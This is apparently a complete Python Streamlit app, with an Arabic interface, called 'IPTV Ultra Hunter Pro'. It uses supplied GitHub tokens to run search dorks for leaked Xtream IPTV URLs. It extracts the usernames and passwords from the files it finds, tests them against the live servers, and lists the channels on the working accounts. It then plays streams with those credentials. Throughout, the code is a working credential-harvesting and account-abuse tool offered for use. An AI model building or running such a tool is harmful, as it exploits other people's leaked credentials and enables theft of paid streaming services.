import streamlit as st
import requests
import re
import time
import hashlib
from datetime import datetime

# إعدادات
REQUEST_TIMEOUT = 5
MAX_PAGES = 50

st.set_page_config(page_title="IPTV Ultra Hunter Pro", layout="wide", page_icon="📡")

# ========== CSS للخلفية السوداء والأخضر الفسفوري ==========
st.markdown("""
<style>
    /* الخلفية السوداء الرئيسية */
    .stApp {
        background-color: #0a0a0a;
    }
    /* جميع النصوص */
    body, .stMarkdown, .stText, .stTitle, .stSubheader, label, .stSelectbox label, .stSlider label {
        color: #00ff88 !important;
        font-family: 'Consolas', monospace;
    }
    /* البطاقات */
    .server-card {
        background-color: #111111;
        padding: 12px;
        border-radius: 10px;
        margin-bottom: 10px;
        border-left: 3px solid #00ff88;
        transition: 0.2s;
        color: #ccffcc;
    }
    .server-card:hover {
        background-color: #1a1a1a;
        transform: translateX(5px);
    }
    .active-server {
        border-left: 5px solid #00ff88;
        background-color: #1a331a;
        box-shadow: 0 0 8px #00ff88;
    }
    .channel-button {
        background-color: #111111;
        color: #00ff88;
        border: 1px solid #00ff88;
        border-radius: 8px;
        padding: 8px;
        margin: 2px 0;
        width: 100%;
        text-align: left;
        cursor: pointer;
        transition: 0.1s;
    }
    .channel-button:hover {
        background-color: #00ff88;
        color: #000000;
    }
    /* شريط التقدم */
    .stProgress > div > div > div > div {
        background-color: #00ff88 !important;
    }
    /* مربع السجل */
    .log-box {
        background-color: #0a0a0a;
        border: 1px solid #00ff88;
        border-radius: 8px;
        padding: 5px;
        font-size: 12px;
        height: 200px;
        overflow-y: auto;
        color: #00ff88;
    }
    hr {
        border-color: #00ff88;
    }
    /* أزرار Streamlit الأصلية */
    .stButton button {
        background-color: #111111;
        color: #00ff88;
        border: 1px solid #00ff88;
        border-radius: 8px;
    }
    .stButton button:hover {
        background-color: #00ff88;
        color: #000000;
    }
    /* حقول الإدخال */
    .stTextInput input, .stTextArea textarea {
        background-color: #111111;
        color: #00ff88;
        border: 1px solid #00ff88;
    }
    /* التحذيرات والمعلومات */
    .stAlert {
        background-color: #111111;
        color: #00ff88;
    }
</style>
""", unsafe_allow_html=True)

# ========== تهيئة session_state ==========
defaults = {
    "accounts": [], "servers": [], "channels_cache": {},
    "current_server": None, "current_channels": [], "searching": False,
    "log": [], "tokens": [], "proxy": "", "unique_set": set(),
    "dork_list": [
        '"player_api.php?username="', '"get.php?username="', 'filename:m3u "xtream"',
        '"/player_api.php" password', 'xtreamcodes "username" "password"',
        'inurl:player_api.php?username=', 'inurl:get.php?username=',
        '"xtream" filename:config', '"enigma2" user pass', '"streaming" username password m3u'
    ],
    "current_dork_idx": 0, "current_token_idx": 0, "current_page": 1,
    "selected_channel_id": None, "selected_server_idx": None,
    "total_requests": 0, "last_update": 0
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ========== دوال مساعدة محسنة ==========
def extract_xtream_accounts(content):
    pattern = r'(https?://([a-zA-Z0-9.-]+):(\d+))/(?:player_api|get)\.php\?(?:username|user)=([^&\s]+)&(?:password|pass)=([^&\s]+)'
    matches = re.findall(pattern, content, re.IGNORECASE)
    # تنسيق النتيجة: (full_url, host, port, user, pass)
    return [(m[0], m[1], m[2], m[3], m[4]) for m in matches]

def check_account(full_url, host, port, user, pw, proxy):
    try:
        api = f"{full_url}/player_api.php?username={user}&password={pw}"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        r = requests.get(api, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if r.status_code != 200: return None
        data = r.json()
        user_info = data.get("user_info", {})
        if user_info.get("status") == "Active":
            exp = user_info.get('exp_date')
            exp_str = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "دائم"
            # جلب عدد القنوات (اختياري)
            live_cats = data.get("available_channels", {}).get("live", [])
            channels_count = len(live_cats) if isinstance(live_cats, list) else "غير معروف"
            return {
                "full_url": full_url,
                "host": host,
                "port": port,
                "user": user,
                "pass": pw,
                "exp": exp_str,
                "channels_count": channels_count,
                "status": "Active",
                "message": user_info.get("message", "")
            }
    except Exception as e:
        return None
    return None

def search_github(dork, token, page, proxy):
    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code == 200: return resp.json().get('items', [])
        elif resp.status_code == 403:
            st.session_state.log.insert(0, "⚠️ تجاوز حد الطلبات، انتظار 30 ثانية...")
            time.sleep(30)
    except: pass
    return []

def process_raw(raw_url, proxy):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(raw_url, timeout=REQUEST_TIMEOUT, proxies=proxies)
        if resp.status_code != 200: return []
        return extract_xtream_accounts(resp.text)
    except: return []

def load_channels(server, proxy):
    try:
        url = f"{server['full_url']}/player_api.php?username={server['user']}&password={server['pass']}&action=get_live_streams"
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = requests.get(url, timeout=10, proxies=proxies)
        if resp.status_code == 200:
            ch = resp.json()
            if isinstance(ch, list): return ch
    except: pass
    return []

# ========== الشريط الجانبي ==========
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/iptv.png", width=60)
    st.markdown("<h2 style='color:#00ff88;'>⚙️ IPTV Hunter</h2>", unsafe_allow_html=True)
    tokens_input = st.text_area("🔑 GitHub Tokens (سطر لكل توكن)", placeholder="ghp_token1\nghp_token2", height=100)
    proxy_input = st.text_input("🌐 بروكسي (اختياري)", placeholder="http://user:pass@ip:port")
    col1, col2 = st.columns(2)
    if col1.button("🚀 بدء الصيد", use_container_width=True):
        if not tokens_input.strip():
            st.error("أدخل GitHub Tokens")
        else:
            st.session_state.searching = True
            st.session_state.accounts = []
            st.session_state.servers = []
            st.session_state.log = []
            st.session_state.unique_set = set()
            st.session_state.current_dork_idx = 0
            st.session_state.current_token_idx = 0
            st.session_state.current_page = 1
            st.session_state.tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
            st.session_state.proxy = proxy_input if proxy_input else None
            st.session_state.log.insert(0, f"🚀 بدء البحث - {len(st.session_state.tokens)} توكن، {len(st.session_state.dork_list)} دورك")
            st.rerun()
    if col2.button("⏹️ إيقاف الصيد", use_container_width=True):
        st.session_state.searching = False
        st.session_state.log.insert(0, "⏸️ تم إيقاف البحث")
        st.rerun()
    st.markdown("---")
    st.metric("💎 الحسابات الشغالة", len(st.session_state.accounts))
    st.metric("🗄️ الخوادم النشطة", len(st.session_state.servers))
    st.markdown("---")
    st.subheader("📋 سجل العمليات")
    log_container = st.container(height=220)
    with log_container:
        for msg in st.session_state.log[:30]:
            st.markdown(f"<span style='color:#00ff88;'>• {msg}</span>", unsafe_allow_html=True)

# ========== محرك البحث – نتائج فورية ==========
if st.session_state.searching:
    tokens = st.session_state.tokens
    dorks = st.session_state.dork_list
    dork_idx = st.session_state.current_dork_idx
    token_idx = st.session_state.current_token_idx
    page = st.session_state.current_page
    proxy = st.session_state.proxy

    # إعادة تدوير المؤشرات
    if token_idx >= len(tokens):
        token_idx = 0
        dork_idx += 1
        if dork_idx >= len(dorks):
            dork_idx = 0
            st.session_state.log.insert(0, "🔄 بدأ دورة بحث جديدة")
        st.session_state.current_token_idx = token_idx
        st.session_state.current_dork_idx = dork_idx
        st.session_state.current_page = 1
        st.rerun()

    token = tokens[token_idx]
    dork = dorks[dork_idx]
    
    # شريط التقدم
    total_steps = len(tokens) * len(dorks) * MAX_PAGES
    current_step = (token_idx * len(dorks) * MAX_PAGES) + (dork_idx * MAX_PAGES) + page
    progress = min(1.0, current_step / total_steps)
    progress_bar = st.progress(progress)
    status_text = st.empty()
    status_text.markdown(f"<span style='color:#00ff88;'>🔍 البحث: {dork[:40]} | صفحة {page}/{MAX_PAGES} | توكن {token[:8]}... | فريد: {len(st.session_state.unique_set)}</span>", unsafe_allow_html=True)
    
    items = search_github(dork, token, page, proxy)
    if items:
        status_text.markdown(f"<span style='color:#00ff88;'>📄 معالجة {len(items)} ملف...</span>", unsafe_allow_html=True)
        for item in items:
            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            accounts_raw = process_raw(raw_url, proxy)
            for full_url, host, port, user, pw in accounts_raw:
                uid = hashlib.md5(f"{full_url}{user}{pw}".encode()).hexdigest()
                if uid in st.session_state.unique_set: continue
                st.session_state.unique_set.add(uid)
                checked = check_account(full_url, host, port, user, pw, proxy)
                if checked:
                    st.session_state.accounts.append(checked)
                    # إضافة الخادم إذا لم يكن موجوداً
                    exists = any(s['full_url'] == checked['full_url'] for s in st.session_state.servers)
                    if not exists:
                        st.session_state.servers.append(checked)
                        st.session_state.log.insert(0, f"✅ خادم جديد: {checked['host']}:{checked['port']} | {checked['user']}:{checked['pass']} | انتهاء {checked['exp']} | قنوات {checked['channels_count']}")
                    else:
                        st.session_state.log.insert(0, f"✅ حساب إضافي: {checked['host']}:{checked['port']} | {checked['user']}:{checked['pass']}")
                    if len(st.session_state.log) > 50: st.session_state.log = st.session_state.log[:50]
        st.session_state.current_page += 1
        if st.session_state.current_page > MAX_PAGES:
            st.session_state.current_page = 1
            st.session_state.current_token_idx += 1
    else:
        st.session_state.current_token_idx += 1
        st.session_state.current_page = 1
    
    # إضافة رسالة حالة
    st.session_state.log.insert(0, f"⏳ فحص {len(st.session_state.unique_set)} رابط، {len(st.session_state.servers)} خادم نشط")
    if len(st.session_state.log) > 50: st.session_state.log = st.session_state.log[:50]
    
    time.sleep(0.7)
    st.rerun()
else:
    st.info("اضغط 'بدء الصيد' لبدء البحث عن حسابات Xtream")

# ========== واجهة ثلاثية الأعمدة ==========
st.markdown("---")
st.markdown("<h1 style='text-align:center; color:#00ff88;'>📡 IPTV Ultra Hunter Pro</h1>", unsafe_allow_html=True)
col_servers, col_channels, col_player = st.columns([1.2, 2, 2.5])

# ----- العمود 1: قائمة الخوادم (بيانات كاملة) -----
with col_servers:
    st.markdown("<h3 style='color:#00ff88;'>🗄️ خوادم Xtream النشطة</h3>", unsafe_allow_html=True)
    if st.session_state.servers:
        for idx, srv in enumerate(st.session_state.servers):
            active_class = "active-server" if st.session_state.selected_server_idx == idx else ""
            with st.container():
                st.markdown(f"""
                <div class='server-card {active_class}'>
                    <b>🌐 {srv['host']}:{srv['port']}</b><br>
                    👤 {srv['user']}<br>
                    🔑 {srv['pass']}<br>
                    📅 انتهاء: {srv['exp']}<br>
                    📺 قنوات: {srv['channels_count']}
                </div>
                """, unsafe_allow_html=True)
                if st.button(f"اختيار", key=f"sel_{idx}", use_container_width=True):
                    st.session_state.selected_server_idx = idx
                    st.session_state.current_server = srv
                    key = f"{srv['full_url']}|{srv['user']}"
                    if key in st.session_state.channels_cache:
                        st.session_state.current_channels = st.session_state.channels_cache[key]
                    else:
                        with st.spinner("تحميل القنوات..."):
                            ch = load_channels(srv, st.session_state.proxy)
                            st.session_state.channels_cache[key] = ch
                            st.session_state.current_channels = ch
                    st.session_state.selected_channel_id = None
                    st.rerun()
    else:
        st.info("لا توجد خوادم بعد. ابدأ البحث.")

# ----- العمود 2: قائمة القنوات الطويلة -----
with col_channels:
    st.markdown("<h3 style='color:#00ff88;'>📺 قنوات السيرفر المختار</h3>", unsafe_allow_html=True)
    if st.session_state.current_server:
        st.markdown(f"<span style='color:#00ff88;'><b>{st.session_state.current_server['host']}:{st.session_state.current_server['port']}</b> | {st.session_state.current_server['user']}</span>", unsafe_allow_html=True)
        search_ch = st.text_input("🔍 بحث في القنوات", placeholder="اسم القناة...", key="search_channels")
        if st.session_state.current_channels:
            filtered = [c for c in st.session_state.current_channels if search_ch.lower() in c['name'].lower()] if search_ch else st.session_state.current_channels
            scroll_container = st.container(height=540)
            with scroll_container:
                for ch in filtered[:2000]:
                    ch_name = ch['name'][:70]
                    if st.button(f"📡 {ch_name} (ID:{ch['stream_id']})", key=f"ch_{ch['stream_id']}", use_container_width=True):
                        st.session_state.selected_channel_id = ch['stream_id']
                        st.rerun()
        else:
            st.warning("لا توجد قنوات لهذا الخادم")
    else:
        st.info("اختر خادماً من القائمة اليسرى")

# ----- العمود 3: مشغل فيديو محسن -----
with col_player:
    st.markdown("<h3 style='color:#00ff88;'>🎬 مشغل فيديو متقدم</h3>", unsafe_allow_html=True)
    if st.session_state.selected_channel_id and st.session_state.current_server:
        srv = st.session_state.current_server
        col_q1, col_q2 = st.columns(2)
        with col_q1:
            quality = st.selectbox("الجودة", ["HLS (M3U8) - موصى به", "أصلية (TS)", "720p", "480p", "360p", "240p", "144p", "96p"], index=0)
        with col_q2:
            if quality == "HLS (M3U8) - موصى به":
                ext = "m3u8"
            else:
                ext = st.selectbox("الصيغة", ["m3u8", "ts"], index=0)
        
        # بناء الرابط
        base_url = f"{srv['full_url']}/live/{srv['user']}/{srv['pass']}/{st.session_state.selected_channel_id}.{ext}"
        bitrate_map = {"720p": "720", "480p": "480", "360p": "360", "240p": "240", "144p": "144", "96p": "96"}
        if quality in bitrate_map:
            base_url += f"?bitrate={bitrate_map[quality]}"
        
        st.markdown(f"<span style='color:#cccccc;'>🔗 رابط البث: <code>{base_url[:100]}...</code></span>", unsafe_allow_html=True)
        
        # استخدام hls.js دائماً لـ m3u8
        if ext == "m3u8":
            st.components.v1.html(f"""
            <div style="background-color:#000; border-radius:12px; padding:5px;">
                <video id="ultra-player" controls autoplay width="100%" height="auto" style="border-radius:12px;"></video>
            </div>
            <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
            <script>
                var video = document.getElementById('ultra-player');
                if (Hls.isSupported()) {{
                    var hls = new Hls();
                    hls.loadSource('{base_url}');
                    hls.attachMedia(video);
                    hls.on(Hls.Events.MANIFEST_PARSED, function() {{ video.play(); }});
                }} else if (video.canPlayType('application/vnd.apple.mpegurl')) {{
                    video.src = '{base_url}';
                    video.addEventListener('loadedmetadata', function() {{ video.play(); }});
                }} else {{
                    document.write('متصفحك لا يدعم HLS');
                }}
            </script>
            """, height=440)
        else:
            # لصيغة TS - استخدام عنصر video العادي (قد لا يعمل في كل المتصفحات)
            st.video(base_url)
            st.warning("⚠️ صيغة TS قد لا تعمل في جميع المتصفحات. يُفضل استخدام HLS (M3U8).")
        
        if st.button("📋 نسخ رابط البث", use_container_width=True):
            st.code(base_url)
    else:
        st.warning("اختر خادماً ثم قناة من القائمة")
